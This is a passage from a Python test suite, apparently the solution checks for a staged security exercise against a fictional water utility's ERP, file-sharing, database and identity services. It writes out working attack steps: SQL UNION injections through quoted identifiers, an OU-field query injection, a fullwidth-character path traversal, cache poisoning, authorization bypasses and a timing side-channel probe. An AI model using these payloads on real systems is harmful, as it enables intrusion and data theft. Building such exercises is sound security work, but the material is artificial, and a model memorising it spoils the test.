            self.assertRegex(response["audit_id"], r"^[0-9a-f-]{36}$")
            self.evidence["maintenance_case"] = record["maintenance_case"]

        with self.subTest(card="W01.2 the planner's unfinished handover"):
            status, content, _ = native_request(
                "nextcloud",
                "/remote.php/dav/files/{user}/Veybridge%20handover/planning-handover-2026-09.md",
                expected=200,
            )
            text = content.decode()
            self.assertIn("PLN-HO-CRR-17", text)
            self.assertIn("INSP-CRR-2026-09-18", text)
            self.assertIn("Nadia Corvane", text)
            self.evidence["inspection"] = "INSP-CRR-2026-09-18"
            self.evidence["planning_handover_sha256"] = hashlib.sha256(content).hexdigest()

        with self.subTest(card="W01.3 how the company buys time"):
            _, content, _ = native_request(
                "nextcloud",
                "/remote.php/dav/files/{user}/Veybridge%20handover/procurement-continuity.md",
                expected=200,
            )
            text = content.decode()
            for phrase in ("supplementary water purchasing", "Stage A restrictions", "reservation must be accepted"):
                self.assertIn(phrase, text)

        with self.subTest(card="W01.4 change the corporate record"):
            task = one(erp_list("Task", {"subject": "Supplier handback — MTN-CRR-204"},
                                         ["name", "project", "status", "description"]), "supplier handback Task")
            description = task["description"].rstrip() + " Confirmed inspection: " + self.evidence["inspection"]
            _, changed = native_json(
                "erpnext", "/api/resource/Task/" + quote(task["name"], safe=""), method="PUT",
                body={"status": "Working", "description": description}, expected=200,
            )
            self.assertEqual(changed["data"]["status"], "Working")
            self.assertIn(self.evidence["inspection"], changed["data"]["description"])
            self.evidence["supplier_handback_task"] = task["name"]
            self.evidence["supplier_project"] = task["project"]

    # ------------------------------------------------------------------ W02
    def test_w02_asset_association(self) -> None:
        with self.subTest(card="W02.1 the asset and the contractor"):
            order_row = one(erp_list("Purchase Order", {"title": "PO-VEY-4417"},
                                               ["name", "title", "supplier", "docstatus"]), "supplier purchase order")
            _, response = native_json(
                "erpnext", "/api/resource/Purchase%20Order/" + quote(order_row["name"], safe=""), expected=200,
            )
            order = response["data"]
            self.assertEqual(order["supplier"], "Veybridge Field Services")
            self.assertTrue(any("AST-CRR-017" in row.get("description", "") for row in order["items"]))
            self.evidence["supplier_order"] = order["name"]

        with self.subTest(card="W02.2 three names for one job"):
            project = one(erp_list("Project", {"project_name": "WO-CRR-4417 — Cairn Reach outlet inspection"},
                                      ["name", "project_name"]), "Cairn Reach Project")
            _, annex, _ = native_request(
                "nextcloud", "/remote.php/dav/files/{user}/Veybridge%20handover/ANN-4417.md", expected=200,
            )
            _, register, _ = native_request(
                "nextcloud", "/remote.php/dav/files/{user}/Veybridge%20handover/engineering-reference-register.csv",
                expected=200,
            )
            self.assertIn("VYB-204-77", annex.decode())
            self.assertIn("DRG-CRR-OUT-017", annex.decode())
            self.assertIn("AST-CRR-017", register.decode())
            self.evidence["supplier_project"] = project["name"]
            self.evidence["annex_sha256"] = hashlib.sha256(annex).hexdigest()
            self.evidence["register_sha256"] = hashlib.sha256(register).hexdigest()

        with self.subTest(card="W02.3 the record behind the wrong association"):
            restricted = one(erp_list("Task", {"subject": "MR-CRR-4417-R6 — Engineering inspection record"},
                                      ["name", "project", "description"]), "shared engineering Task")
            self.assertEqual(restricted["project"], self.evidence["supplier_project"])
            self.assertIn("AST-CRR-017", restricted["description"])
            neighbor = "MR-RIV-3308-R2 — Engineering inspection record"
            neighbor_query = urlencode({"filters": json.dumps({"subject": neighbor}),
                                        "fields": json.dumps(["name"]), "limit_page_length": 2})
            _, denied = native_json("erpnext", "/api/resource/Task?" + neighbor_query, expected=200)
            self.assertEqual(denied["data"], [])
            status, _, _ = native_request(
                "erpnext", "/api/resource/Task/" + quote(restricted["name"], safe=""), method="PUT",
                body={"description": restricted["description"] + " unauthorized change"}, expected={403},
            )
            self.assertEqual(status, 403)
            self.evidence["restricted_task"] = restricted["name"]

    # ------------------------------------------------------------------ W03
    def test_w03_annex_reference(self) -> None:
        with self.subTest(card="W03.1 an annex left with the order"):
            files = erp_list("File", {"file_name": "ANN-4417-R2.md", "attached_to_doctype": "Purchase Order",
                                      "attached_to_name": self.evidence["supplier_order"]},
                             ["name", "file_name", "file_url", "is_private"])
            attachment = one(files, "private purchase-order attachment")
            self.assertEqual(attachment["is_private"], 1)
            _, annex, _ = native_request("erpnext", attachment["file_url"], expected=200)
            text = annex.decode()
            self.assertIn("ANN-4417-R2", text)
            self.assertIn("DRG-CRR-OUT-017", text)
            self.evidence["order_annex_sha256"] = hashlib.sha256(annex).hexdigest()

        with self.subTest(card="W03.2 a reference outside the order"):
            propfind = b'<?xml version="1.0"?><d:propfind xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns"><d:prop><oc:fileid/></d:prop></d:propfind>'
            _, metadata, _ = native_request(
                "nextcloud", "/remote.php/dav/files/{user}/Veybridge%20handover/ANN-4417.md",
                method="PROPFIND", body=propfind,
                headers={"Depth": "0", "Content-Type": "application/xml"}, expected=207,
            )
            match = re.search(rb"<oc:fileid>(\d+)</oc:fileid>", metadata)
            self.assertIsNotNone(match)
            file_id = match.group(1).decode()
            _, versions, _ = native_request(
                "nextcloud", f"/remote.php/dav/versions/{{user}}/versions/{file_id}/",
                method="PROPFIND", headers={"Depth": "1"}, expected=207,
            )
            version_ids = re.findall(rb"/versions/\d+/(\d+)</d:href>", versions)
            self.assertTrue(version_ids)
            _, prior, _ = native_request(
                "nextcloud", f"/remote.php/dav/versions/{{user}}/versions/{file_id}/{version_ids[-1].decode()}",
                expected=200,
            )
            self.assertIn("ANN-4417-R1", prior.decode())
            _, shares = native_json(
                "nextcloud", "/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json&shared_with_me=true",
                headers={"OCS-APIRequest": "true"}, expected=200,
            )
            incoming = shares["ocs"]["data"]
            acceptance = [row for row in incoming if row.get("file_target", "").endswith("integration-read-acceptance.md")]
            self.assertEqual(len(acceptance), 1)
            self.assertEqual(int(acceptance[0]["permissions"]), 1)
            status, _, _ = native_request(
                "nextcloud", "/remote.php/dav/files/{user}/Engineering%20reviews",
                method="PROPFIND", headers={"Depth": "1"}, expected={403, 404},
            )
            self.assertIn(status, {403, 404})

        with self.subTest(card="W03.3 the integration's read contract"):
            _, schema = native_json("postgrest", "/", expected=200)
            self.assertIn("/reserve_report", schema["paths"])
            self.assertNotIn("/allocation_ledger", schema["paths"])
            _, rows = native_json(
                "postgrest", "/reserve_report?record_id=eq.RPT-CRR-DP3-R7", expected=200,
            )
            self.assertEqual(len(rows), 1)
            self.assertEqual(rows[0]["asset"], "AST-CRR-017")
            status, _, _ = native_request("postgrest", "/allocation_ledger", expected=404)
            self.assertEqual(status, 404)
            status, _, _ = native_request(
                "postgrest", "/reserve_report", method="POST", body={"record_id": "unaccepted"}, expected={401, 403},
            )
            self.assertIn(status, {401, 403})
            self.evidence["read_contract"] = rows[0]

    # ------------------------------------------------------------------ W04
    def test_w04_archive_helper(self) -> None:
        base = self.host("retained_archive")

        with self.subTest(card="W04.1 the archive's missing contract"):
            status, response = request(self.discovered_route("archive.contract"), expected=200)
            record = response["record"]
            self.evidence["archive_token"] = record["enrollment_token"]
            self.evidence["protected_record"] = record["protected_record"]
            self.evidence["planner_target"] = record["planner_handover_target"]
            self.assertRegex(record["record_id"], r"^AWF-")
            self.assertEqual(record["enrollment_profile"]["use"], "one time")
            self.assertNotEqual(record["protected_record"], record["planner_handover_target"])

        with self.subTest(card="W04.2 the query behind the identity"):
            # The enrollment copies the caller-supplied OU into the backend query;
            # a subject injection reaches the protected archive record.
            protected = self.evidence["protected_record"]
            ou = f"MaintenanceArchive' OR record_id='{protected}' OR 'a'='b"
            status, enrolled = request(
                self.discovered_route("archive.archived-query"), method="POST",
                body={"operation": "enroll", "enrollment_token": self.evidence["archive_token"], "organizational_unit": ou},
                expected=201)
            status, result = request(
                self.discovered_route("archive.archived-query"), method="POST", body={"operation": "query"},
                certificate=enrolled["certificate"], private_key=enrolled["private_key"], expected=201)
            self.assertEqual(result["record"]["record_id"], protected)

        with self.subTest(card="W04.3 the archive helper acts"):
            # A fullwidth (NFKC) traversal member passes the raw-member check and
            # normalizes to the protected copy_handover path.
            crafted = make_archive(f"．．／copy_handover({self.evidence['planner_target']})")
            status, response = request(
                self.discovered_route("archive.run-operation"), method="POST", body={"archive": crafted}, expected=201)
            self.assertEqual(response["record"]["record_id"], self.evidence["planner_target"])
            # The recovered planner handover token is saved for the planning path.
            write_receipt("planner-handover", response["planner_handover"])
            self.evidence["planner_handover_token"] = response["planner_handover"]

    # ------------------------------------------------------------------ W05
    def test_w05_temporary_identity(self) -> None:
        base = self.host("corporate_identity")

        with self.subTest(card="W05.1 a starter pack left open"):
            status, starter = request(self.discovered_route("identity.provisioning-package"), expected=200)
            record = starter["record"]
            self.assertIsNone(record["activation_secret"])
            self.evidence["temp_employee"] = record["employee_number"]
            self.evidence["temp_assignment"] = record["assignment"]

        with self.subTest(card="W05.2 the activation roster"):
            status, roster = request(self.discovered_route("identity.activation-roster"), expected=200)
            self.evidence["activation_code"] = roster["record"]["activation_code"]
            self.assertNotEqual(roster["record"]["approved_assignment"], self.evidence["temp_assignment"])

        with self.subTest(card="W05.3 temporary, with the wrong rights"):
            # Activation checks the code but omits the assignment binding, so the
            # starter's own assignment is granted instead of the approved one.
            status, _ = request(
                self.discovered_route("identity.temporary-credential"), method="POST",
                body={"employee_number": self.evidence["temp_employee"], "activation_code": "000000", "requested_assignment": self.evidence["temp_assignment"]})
            self.assertEqual(status, 409)
            status, response = request(
                self.discovered_route("identity.temporary-credential"), method="POST",
                body={"employee_number": self.evidence["temp_employee"], "activation_code": self.evidence["activation_code"], "requested_assignment": self.evidence["temp_assignment"]},
                expected=201)
            self.assertEqual(response["record"]["assignment"], self.evidence["temp_assignment"])
            self.assertFalse(response["record"]["administrative"])
            self.evidence["limited_session"] = response["limited_session"]

    # ------------------------------------------------------------------ W06
    def test_w06_planner_session(self) -> None:
        base = self.host("corporate_identity")
        access = {"X-ARWC-Planning-Access": self.evidence["limited_session"]}
        preview_origin = "https://preview-cinder.arwc.test"

        with self.subTest(card="W06.1 the planner's login trail"):
            status, response = request(self.discovered_route("identity.session-audit"), headers=access, expected=200)
            record = response["record"]
            self.evidence["oauth_transaction"] = record["oauth_transaction"]
            self.evidence["oauth_state"] = record["oauth_state"]
            self.evidence["planner_drawing"] = record.get("drawing", "DRW-OG2-R8")
            self.evidence["planner_review"] = record["review"]
            # A wrong planning access is refused.
            status, _ = request(self.discovered_route("identity.session-audit"), headers={"X-ARWC-Planning-Access": "wrong"})
            self.assertEqual(status, 403)

        with self.subTest(card="W06.2 a drawing in the wrong context"):
            status, response = request(
                self.discovered_route("identity.drawing-context"), method="POST", headers=access,
                body={"oauth_state": self.evidence["oauth_state"], "drawing": self.evidence["planner_drawing"],
                      "review": self.evidence["planner_review"], "preview_origin": preview_origin}, expected=201)
            self.assertEqual(response["record"]["preview_origin"], preview_origin)

        with self.subTest(card="W06.3 a planner session that works"):
            status, response = request(
                self.discovered_route("identity.sessions"), method="POST", headers=access,
                body={"oauth_transaction": self.evidence["oauth_transaction"], "preview_origin": preview_origin}, expected=201)
            self.assertEqual(response["record"]["scope"], "planning-records")
            write_receipt("planner-session", response["planner_session"])
            self.evidence["planner_session"] = response["planner_session"]

    # ------------------------------------------------------------------ W07
    def test_w07_planning_query(self) -> None:
        base = self.host("planning_data")
        planner = {"X-ARWC-Planner-Session": "@planner"}

        with self.subTest(card="W07.1 the query the planner keeps"):
            status, response = request(self.discovered_route("planning.saved-query"), headers=planner, expected=200)
            record = response["record"]
            self.evidence["report_view"] = record["view"]
            self.evidence["quote"] = record["identifier_quote"]
            self.assertEqual(record["policy"], "SELECT only")
            self.assertEqual(record["ordinary_request"]["report_name"], record["view"])

        with self.subTest(card="W07.2 read beyond the allowed statement"):
            # The ordinary quoted-identifier request reveals the exact column list.
            status, ordinary = request(
                self.discovered_route("planning.query-run"), method="POST", headers=planner,
                body={"report_name": self.evidence["report_view"]}, expected=201)
            columns = re.search(r"SELECT ([a-z_,]+) FROM", ordinary["statement"]).group(1)
            q = self.evidence["quote"]
            # Close the quoted identifier and UNION in the protected allocation view.
            injection = f'{self.evidence["report_view"]}{q} UNION ALL SELECT {columns} FROM district_allocation_adjustment --'
            status, response = request(
                self.discovered_route("planning.query-run"), method="POST", headers=planner,
                body={"report_name": injection}, expected=201)
            self.assertIn("UNION ALL SELECT", response["statement"])
            self.evidence["allocation_record"] = response["record"]["record_id"]
            # A write or semicolon attempt is refused.
            status, _ = request(
                self.discovered_route("planning.query-run"), method="POST", headers=planner,
                body={"report_name": f'{self.evidence["report_view"]}{q} DELETE FROM {self.evidence["report_view"]} --'})
            self.assertIn(status, (403, 409))

        with self.subTest(card="W07.3 the database does more than read"):
            # The allocation adjustment names its reconciliation record (ADJ -> REC).
            reconcile_record = self.evidence["allocation_record"].replace("ADJ-", "REC-")
            status, response = request(
                self.discovered_route("planning.query-run"), method="POST", headers=planner,
                body={"function": "arwc_reconcile_copy", "record_id": reconcile_record}, expected=201)
            self.assertEqual(response["record"]["execution_context"], "SECURITY DEFINER")
            self.assertEqual(response["record"]["source_record"], reconcile_record)

    # ------------------------------------------------------------------ W09
    def test_w09_water_reconciliation(self) -> None:
        planning = self.host("planning_data")
        business = self.host("business_workplace")
        planner = {"X-ARWC-Planner-Session": "@planner"}

        with self.subTest(card="W09.1 water already promised"):
            status, response = request(self.discovered_route("planning.allocation-ledger"), headers=planner, expected=200)
            ledger = response["record"]
            self.evidence["ledger_record"] = ledger["record_id"]
            self.evidence["planning_window"] = ledger["planning_window"]
            self.evidence["committed_ml"] = ledger["committed_ml"]
            self.assertRegex(ledger["record_id"], r"^ALLOC-")
            self.assertGreater(ledger["committed_ml"], 0)

        with self.subTest(card="W09.2 the meter's own account"):
            status, response = request(self.discovered_route("planning.meter-allocation"), headers=planner, expected=200)
            meter = response["record"]
            # The meter export is a distinct record; it does not carry the ledger's identity.
            self.assertNotIn(self.evidence["ledger_record"], json.dumps(meter))
            self.evidence["usable_reserve_ml"] = meter["usable_reserve_ml"]
            self.evidence["instruments"] = meter["instruments"]
            self.evidence["meter_record"] = meter["record_id"]

        with self.subTest(card="W09.3 the missing megalitre"):
            # Reconciliation requires both independent sources (ledger + meter).
            status, response = request(self.discovered_route("planning.allocation-discrepancy"), headers=planner, expected=200)
            record = response["record"]
            self.assertEqual(record["committed_ml"], self.evidence["committed_ml"])
            self.assertEqual(record["usable_reserve_ml"], self.evidence["usable_reserve_ml"])
            self.evidence["reconciliation_record"] = record["record_id"]
            self.evidence["reported_ml"] = record["reported_ml"]
            self.evidence["outlet_group"] = record["outlet_group"]

        with self.subTest(card="W09.4 from the report to the live feed"):
            status, contract = request(self.discovered_route("business.integration-contract"), expected=200)
            # planning-data requires both the planner session and the integration session.
            integration = {**planner, "X-ARWC-Integration-Session": contract["integration_session"]}
            client = contract["record"]["integration_client"]
            scope = contract["record"]["scope"]
            # The report's current source list names the live feed record to join.
            status, sources = request(self.discovered_route("business.report-sources"), expected=200)
            feed_id = next(s["record_id"] for s in sources["record"]["sources"] if s["record_id"].startswith("FEED-"))
            self.evidence["feed_id"] = feed_id
            # Without the integration session, the gateway refuses even a correct binding.
            binding = {"integration_client": client, "report_binding": self.evidence["reconciliation_record"],
                       "scope": scope, "feed": feed_id}
            status, _ = request(self.discovered_route("planning.integration-session"), method="POST", headers=planner, body=binding)
            self.assertEqual(status, 403)
            # A wrong client is refused once the session is supplied.
            status, _ = request(self.discovered_route("planning.integration-session"), method="POST",
                                 headers=integration, body=dict(binding, integration_client="INT-MER-01"))
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("planning.integration-session"), method="POST",
                                        headers=integration, body=binding, expected=201)
            self.assertTrue(response["record"]["current"])
            self.assertEqual(response["record"]["outlet_group"], self.evidence["outlet_group"])

    # ------------------------------------------------------------------ W10
    def test_w10_cross_district_excerpt(self) -> None:
        base = self.host("business_workplace")

        with self.subTest(card="W10.1 the report's source list"):
            status, response = request(self.discovered_route("business.report-sources"), expected=200)
            record = response["record"]
            self.evidence["source_set"] = record["record_id"]
            self.evidence["source_revision"] = record["revision"]
            self.evidence["source_district"] = record["district"]
            self.assertEqual(record["assistant"], "district-report-assistant")
            self.assertGreaterEqual(len(record["sources"]), 2)
            self.assertTrue(all(source["status"] == "current" for source in record["sources"]))

        with self.subTest(card="W10.2 another district in the results"):
            # The handler checks the role and the exact source set/revision, but
            # not that the requested district matches the session's own district.
            baseline = {"source_set": self.evidence["source_set"], "expected_revision": self.evidence["source_revision"],
                        "role": "planning-reader", "district": self.evidence["source_district"]}
            status, _ = request(self.discovered_route("business.report-row-external"), method="POST", body=dict(baseline, expected_revision=baseline["expected_revision"] - 1))
            self.assertEqual(status, 409)
            status, _ = request(self.discovered_route("business.report-row-external"), method="POST", body=dict(baseline, role="customer-service"))
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("business.report-row-external"), method="POST", body=baseline, expected=201)
            excerpt = response["record"]
            self.assertNotEqual(excerpt["district"], self.evidence["source_district"])
            self.evidence["excerpt_id"] = excerpt["record_id"]
            self.evidence["excerpt_revision"] = excerpt["revision"]
            self.evidence["linked_document"] = excerpt["linked_document"]

        with self.subTest(card="W10.3 the document behind the answer"):
            # Linking is checked by possession of the exact excerpt, not district.
            status, _ = request(self.discovered_route("business.report-document"), method="POST",
                                 body={"excerpt_id": self.evidence["excerpt_id"], "expected_revision": self.evidence["excerpt_revision"] - 1})
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("business.report-document"), method="POST",
                                        body={"excerpt_id": self.evidence["excerpt_id"], "expected_revision": self.evidence["excerpt_revision"], "district": self.evidence["source_district"]},
                                        expected=201)
            self.assertEqual(response["record"]["record_id"], self.evidence["linked_document"])

    # ------------------------------------------------------------------ W11
    def test_w11_relation_protocol(self) -> None:
        planner = {"X-ARWC-Planner-Session": "@planner"}
        asset = self.evidence["asset_bundle"]["asset"]
        mb_session = metabase_session()

        with self.subTest(card="W11.1 the relation service's language"):
            # planning.relation-schema → native Metabase question on relation_contracts.
            schema_url = self.discovered_route("planning.relation-schema")
            card_path = "/api/card/" + schema_url.split("/api/card/")[1]
            status, card = metabase_request(card_path, session=mb_session, expected=200)
            database_id = card["database_id"]
            # Run the card to get RELPROTO-CRR-R3 contract fields.
            status, result = metabase_request("/api/card/" + schema_url.split("/api/card/")[1] + "/query",
                                              method="POST", session=mb_session)
            self.assertIn(status, (200, 202))
            rows = result.get("data", {}).get("rows", [])
            col_names = [col["name"] for col in result.get("data", {}).get("cols", [])]
            contract_rows = {row[col_names.index("record_id")]: row for row in rows if col_names}
            self.assertIn("RELPROTO-CRR-R3", contract_rows)
            contract_row = contract_rows["RELPROTO-CRR-R3"]
            self.evidence["relation_type"] = contract_row[col_names.index("relation")]
            self.evidence["association"] = contract_row[col_names.index("association")]
            self.evidence["relation_db_id"] = database_id
            self.assertEqual(contract_row[col_names.index("relation")], "ASSET_WORK")
            self.assertEqual(contract_row[col_names.index("association")], "ASC-CRR-4417")

        with self.subTest(card="W11.2 an exchange the backend accepts"):
            # planning.relation-exchange → native Metabase question REL-QUERY-CRR-R3.
            # Quoted-identifier injection: escaping the {{relation_type}} identifier
            # UNIONs in relation_responses to return REL-ASC-CRR-4417-R3.
            db_id = self.evidence["relation_db_id"]
            injection = (
                'work_order_summary" UNION SELECT name, revision, relation, asset, work_order '
                'FROM relation_responses --'
            )
            status, result = metabase_request("/api/dataset", method="POST",
                session=mb_session,
                body={"database": db_id, "type": "native",
                      "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{injection}',
                                 "template-tags": {}}})
            self.assertIn(status, (200, 202))
            rows = result.get("data", {}).get("rows", [])
            record_ids = [row[0] for row in rows]
            self.assertIn("REL-ASC-CRR-4417-R3", record_ids)
            rel_row = next(row for row in rows if row[0] == "REL-ASC-CRR-4417-R3")
            self.assertEqual(rel_row[2], "ASSET_WORK")
            self.assertEqual(rel_row[3], asset)
            self.evidence["work_order_from_relation"] = rel_row[4]
            self.assertNotIn("LIN-AST-CRR-017-R8", record_ids)

        with self.subTest(card="W11.3 the asset's true lineage"):
            # Extend the W11.2 injection surface with a second UNION that calls
            # get_asset_lineage(), a SECURITY DEFINER function that bypasses
            # planning_reader's lack of SELECT on lineage_records.
            db_id = self.evidence["relation_db_id"]
            lineage_injection = (
                f"work_order_summary\" UNION SELECT name, revision, relation, asset, work_order "
                f"FROM get_asset_lineage('{asset}') --"
            )
            status, result = metabase_request("/api/dataset", method="POST",
                session=mb_session,
                body={"database": db_id, "type": "native",
                      "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{lineage_injection}',
                                 "template-tags": {}}})
            self.assertIn(status, (200, 202))
            rows = result.get("data", {}).get("rows", [])
            record_ids = [row[0] for row in rows]
            self.assertIn("LIN-AST-CRR-017-R8", record_ids)
            lin_row = next(row for row in rows if row[0] == "LIN-AST-CRR-017-R8")
            self.assertEqual(lin_row[3], asset)
            self.assertIn("ARC-COLD-CRR-2019", lin_row[2])

    # ------------------------------------------------------------------ W13
    def test_w13_contractor_checkin(self) -> None:
        base = self.host("contractor_portal")

        with self.subTest(card="W13.1 window on Thursday"):
            status, response = request(self.discovered_route("contractors.appointment-window"), expected=200)
            appointment = response["record"]
            self.evidence["appointment_id"] = appointment["record_id"]
            self.evidence["appointment_window"] = appointment["window"]
            self.evidence["appointment_inspection"] = appointment["inspection"]
            self.evidence["appointment_asset"] = appointment["asset"]
            self.assertEqual(appointment["window"]["day"], "Thursday")
            self.assertRegex(appointment["record_id"], r"^APT-")

        with self.subTest(card="W13.2 who is expected at the gate"):
            status, response = request(self.discovered_route("contractors.expected-visitors"), expected=200)
            roster = response["record"]
            self.evidence["roster_id"] = roster["record_id"]
            self.evidence["contractor_identity"] = roster["identity"]
            self.evidence["contractor_assignment"] = roster["assignment"]
            self.assertEqual(roster["inspection"], self.evidence["appointment_inspection"])
            self.assertNotEqual(roster["identity"], appointment["attendee"])

        with self.subTest(card="W13.3 an appointment we do not own"):
            # The expected caller organization is implied by the gate roster's
            # contractor identity, not the appointment's current owner.
            organization = "Veybridge Technical Services"
            baseline = {
                "appointment_id": self.evidence["appointment_id"], "expected_revision": 1,
                "attendee": self.evidence["contractor_identity"], "caller_organization": organization,
                "inspection": self.evidence["appointment_inspection"], "asset": self.evidence["appointment_asset"],
                "window": self.evidence["appointment_window"],
            }
            status, _ = request(self.discovered_route("contractors.appointment"), method="POST", body=dict(baseline, asset="AST-MER-004"))
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("contractors.appointment"), method="POST", body=baseline, expected=201)
            self.assertEqual(response["record"]["attendee"], self.evidence["contractor_identity"])

        with self.subTest(card="W13.4 checked in as the contractor"):
            status, _ = request(self.discovered_route("contractors.check-in"), method="POST",
                                 body={"appointment_id": self.evidence["appointment_id"], "roster_id": "ROSTER-CRR-SEP18-R1", "identity": self.evidence["contractor_identity"]})
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("contractors.check-in"), method="POST",
                                        body={"appointment_id": self.evidence["appointment_id"], "roster_id": self.evidence["roster_id"], "identity": self.evidence["contractor_identity"]},
                                        expected=201)
            self.assertEqual(response["record"]["assignment"], self.evidence["contractor_assignment"])
            self.evidence["contractor_session"] = response["contractor_session"]

    # ------------------------------------------------------------------ W14
    def test_w14_field_gateway(self) -> None:
        contractor = self.evidence["contractor_session"]
        contractor_base = self.host("contractor_portal")
        field_base = self.host("field_gateway")

        with self.subTest(card="W14.1 the field bag"):
            status, response = request(self.discovered_route("contractors.field-kit"), token=contractor, expected=200)
            bag = response["record"]
            self.assertEqual(bag["retained_client"]["protocol"], "fieldbag/v1")
            self.evidence["inspection"] = bag["inspection"]
            self.evidence["expected_outlets"] = bag["expected_outlets"]

        with self.subTest(card="W14.2 the service that replaced it"):
            status, response = request(self.discovered_route("field.instrument"), token=contractor, expected=200)
            services = response["record"]["services"]
            current = next(s for s in services if s["status"] == "active")
            self.evidence["current_protocol"] = current["protocol"]
            self.evidence["current_encoding"] = current["encoding"]
            self.assertEqual(current["encoding"], "application/cbor")

        with self.subTest(card="W14.3 a fresh reading from the field"):
            import datetime as _dt
            observed = _dt.datetime.now(_dt.timezone.utc).isoformat().replace("+00:00", "Z")
            group = self.evidence["expected_outlets"][0]
            # The retired v1/JSON protocol is rejected on the current endpoint.
            status, _ = request(self.discovered_route("field.current-reading"), method="POST", token=contractor,
                                 body={"asset_id": self.evidence["asset_bundle"]["asset"], "outlet_group": group, "sample_time": "now"})
            self.assertEqual(status, 409)
            # The current CBOR protocol with the correct outlet group is accepted.
            payload = {"asset": self.evidence["asset_bundle"]["asset"], "group": group, "observed_at": observed, "nonce": "journey-reading-1"}
            status, response = cbor_request(self.discovered_route("field.current-reading"), cbor_map(payload), contractor, expected=201)
            self.assertEqual(response["record"]["group"], group)
            self.assertTrue(response["record"]["observations"])
            # A replayed nonce is refused.
            status, _ = cbor_request(self.discovered_route("field.current-reading"), cbor_map(payload), contractor)
            self.assertEqual(status, 409)

    # ------------------------------------------------------------------ W15
    def test_w15_drawing_cache(self) -> None:
        contractor = self.evidence["contractor_session"]
        base = self.host("maintenance_review")
        drawing = self.evidence["planner_drawing"]
        review_queue = self.evidence["planner_review"]
        preview_origin = "https://preview-cinder.arwc.test"

        with self.subTest(card="W15.1 which drawing did the cache keep"):
            status, response = request(self.discovered_route("maintenance.drawing-cache"), token=contractor, expected=200)
            record = response["record"]
            self.assertEqual(record["drawing"], drawing)
            self.evidence["cache_record"] = record

        with self.subTest(card="W15.2 a drawing of our choosing"):
            cached = self.evidence["cache_record"]
            # Build a traversal variant of the cached path that still normalizes
            # to the same cache key (poisons the cache via an alternate route).
            parent, _, leaf = cached["cache_key_path"].rpartition("/")
            directory = parent.rsplit("/", 1)[-1]
            traversal_path = f"{parent}/../{directory}/{leaf}"
            body = {
                "path": traversal_path,
                "controlled_response": {
                    "drawing_id": drawing, "revision": cached["drawing_revision"], "content_type": "text/html",
                    "body": f"<section data-drawing='{drawing}' data-revision='{cached['drawing_revision']}'>Cinder preview</section>",
                },
            }
            # An unlisted preview origin is refused.
            status, _ = request(self.discovered_route("maintenance.drawing-cache-update"), method="POST", token=contractor, body=body,
                                 headers={"X-Preview-Origin": "https://unlisted-preview.arwc.test"})
            self.assertEqual(status, 409)
            # A prior drawing revision lets the write proceed with a fresh poisoned cache key.
            status, response = request(self.discovered_route("maintenance.drawing-cache-update"), method="POST", token=contractor, body=body,
                                        headers={"X-Preview-Origin": preview_origin, "X-Drawing-Revision": "R7"}, expected=201)
            self.evidence["cache_key"] = response["record"]["cache_key"]

        with self.subTest(card="W15.3 the reviewer trusts the drawing"):
            status, response = request(self.discovered_route("maintenance.drawing-approval"), method="POST", token=contractor,
                                        body={"cache_key": self.evidence["cache_key"], "reviewer_queue": review_queue}, expected=201)
            self.assertEqual(response["record"]["subject"], drawing)
            self.evidence["review_capability"] = response["review_capability"]

        with self.subTest(card="W15.4 approval beyond the token"):
            status, _ = request(self.discovered_route("maintenance.approval-token"), method="POST", token=contractor,
                                 body={"review_capability": "wrong", "approval_id": "APR-CRR-4417-R6", "inspection": self.evidence["inspection"]})
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("maintenance.approval-token"), method="POST", token=contractor,
                                        body={"review_capability": self.evidence["review_capability"], "approval_id": "APR-CRR-4417-R6", "inspection": self.evidence["inspection"]},
                                        expected=201)
            record = response["record"]
            self.assertEqual(record["status"], "signed")
            self.evidence["w15_approval"] = record
            verify = (
                "import base64, sys\n"
                "from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey\n"
                "Ed25519PublicKey.from_public_bytes(base64.b64decode(sys.argv[1])).verify(base64.b64decode(sys.argv[2]), sys.stdin.buffer.read())\n"
            )
            canonical = json.dumps({k: v for k, v in record.items() if k not in {"signature_algorithm", "signature", "signing_public_key"}},
                                    sort_keys=True, separators=(",", ":")).encode()
            verified = inside_bytes(
                "python3", "-c", verify, record["signing_public_key"], record["signature"],
                input_bytes=canonical,
            )
            self.assertEqual(verified.returncode, 0, verified.stderr.decode())

    # ------------------------------------------------------------------ W16
    def test_w16_sequencer_signal(self) -> None:
        base = self.host("retained_archive")

        def program(opcodes: dict, *instructions: tuple) -> str:
            encoded = bytearray()
            for name, *operands in instructions:
                encoded.append(opcodes[name])
                encoded += bytes((list(operands) + [0, 0, 0])[:3])
            return base64.b64encode(bytes(encoded)).decode()

        def binding(sequencer: str, revision: int, **extra: object) -> dict:
            return {"sequencer": sequencer, "revision": revision, "request_id": "req-" + uuid.uuid4().hex, **extra}

        with self.subTest(card="W16.1 the sequencer's vocabulary"):
            status, response = request(self.discovered_route("archive.sequencer-spec"), expected=200)
            descriptor = response["record"]
            canonical = json.dumps(descriptor, sort_keys=True, separators=(",", ":")).encode()
            self.assertEqual(response["descriptor_sha256"], hashlib.sha256(canonical).hexdigest())
            self.evidence["sequencer"] = descriptor
            sequencer_id, revision = descriptor["record_id"], descriptor["revision"]

            def measure_byte(slot: int) -> int:
                probes = (0, 1, 2, 4, 8, 16, 32, 64, 128)
                measurements: dict[int, list[int]] = {probe: [] for probe in probes}
                for group in (probes[:7], probes[7:]):
                    instructions = [("TEST", slot, probe) for probe in group for _ in range(8)] + [("HALT",)]
                    status, body = request(self.discovered_route("archive.signal-experiment"), method="POST", body=binding(sequencer_id, revision, operation="measure", program=program(descriptor["opcodes"], *instructions)),
                        expected=201)
                    for observation in body["record"]["observations"]:
                        measurements[observation["probe"]].append(observation["cycles"])
                means = {probe: sum(v) / len(v) for probe, v in measurements.items()}
                value = 0
                for bit in range(8):
                    if means[1 << bit] < means[0]:
                        value |= 1 << bit
                return value
            self.evidence["measure_byte"] = measure_byte

        with self.subTest(card="W16.2 an observation outside the window"):
            measure_byte = self.evidence["measure_byte"]
